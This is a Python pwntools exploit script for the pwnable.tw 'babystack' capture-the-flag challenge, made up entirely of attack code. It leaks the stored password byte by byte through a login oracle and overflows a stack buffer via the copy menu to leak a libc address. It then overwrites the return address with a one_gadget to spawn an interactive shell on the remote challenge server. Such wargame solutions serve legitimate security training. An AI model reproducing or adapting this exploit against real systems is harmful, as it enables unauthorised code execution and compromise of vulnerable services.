from pwn import *

local = 0

if local:
	s = process('./babystack', env={"LD_PRELOAD" : "./libc_64.so.6"})
	raw_input('DEBUG')
else:
	s = remote('chall.pwnable.tw', 10205)

one_gadget = 0xf0567
libc = ELF('libc_64.so.6')

def check(char, password):
	s.sendlineafter(b'>> ', b'1')
	if b'Your passowrd :' not in s.recv():
		s.sendline(b'1')
	s.sendline(password + char.to_bytes(1, byteorder='little'))
	if b'Login Success !' in s.recvline():
		return True
	return False


def bruteforce(length, password = b''):	
	for i in range(length):
		log.info('Leaking byte: %d', i)
		for j in range(1, 256):
			if j == 10:
				continue
			if check(j, password):
				password += j.to_bytes(1, byteorder='little')
				break
		else:
			print('Error equal 0')
			exit(0)

	return password

password = bruteforce(16, b'')

log.info('[*] password leak: ')
print(password)

s.sendlineafter(b'>> ', b'1')

s.sendlineafter(b'>> ', b'1')

payload = password + p64(0) + b'A' * 0x30

s.sendafter(b'Your passowrd :', payload)

s.sendlineafter(b'>> ', b'3')

s.sendafter(b'Copy :', b'A' * 63)

leak = bruteforce(6, b'A' * 8)[8:]

log.info('[*] leak libc: 0x%x', int.from_bytes(leak, byteorder = 'little', signed = False))

libc.address = int.from_bytes(leak, byteorder = 'little', signed = False) - 0x78439

log.info('[*] libc base: 0x%x', libc.address)

s.sendlineafter(b'>> ', b'1')

s.sendlineafter(b'>> ', b'1')

payload = b'A' + b'\x00' * 7 + b'A' * 0x38 + password + b'A' * 0x18 + p64(one_gadget + libc.address)

s.sendlineafter(b'Your passowrd :', payload)

s.sendlineafter(b'>> ', b'3')

s.sendafter(b'Copy :', b'A' * 63)

s.sendlineafter(b'>> ', b'2')

s.interactive()
